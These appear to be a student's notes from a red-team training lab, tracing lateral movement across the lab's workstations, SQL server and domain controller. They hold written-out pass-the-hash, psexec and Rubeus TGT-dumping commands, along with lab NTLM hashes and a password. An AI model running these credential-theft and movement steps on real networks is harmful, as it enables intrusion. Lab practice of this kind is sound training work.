WKSTN-2 (bfarmer)
- By Signing in and out of WKSTN-2 due to beacon 

-> WKSTN-2 (System)
- By running `connect localhost 4444` thanks to listener setup previously

--> WKSTN-2 (System * DEV\jking)
- pth as jking to become part of administrators/rdp group
- `pth DEV\jking 59fc0f884922b4ce376051134c71e22c`
- jump to sql-2.dev.cyberbotic.io server using psexec as jking

--> sql-2.dev.cyberbotic.io (System)
- `jump psexec64 sql-2.dev.cyberbotic.io smb`

---> dc-2 (SYSTEM)
`reference NTLM Relaying for complete notes on this method`

-->  WKSTN-1 (SYstem\ nlamb)
- `jump psexec64 wkstn-1.dev.cyberbotic smb`
- `pth DEV\nlamb 2e8a408a8aec852ef2e458b938b8c071 `

nlamb credentials: F3rrari
nlamb: ntlm: 2e8a408a8aec852ef2e458b938b8c071

![[GENERAL FLOW THUS FAR.png]]

- in order to dump tgt's
```bash
# run this command to get LUID's of USER's and services to then dump TGT's
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# command to dump specific luids - TGT's are too long to be able to copy from vm to vm so have to run this everytime

#jking TGT is on WKSTN-2
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x57ccc /nowrap

TGT:
doIFXXXXXXXXXXXXXXXXXXXXXXXXX

#sql2 user
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x5bcb3 /nowrap

doIFp


```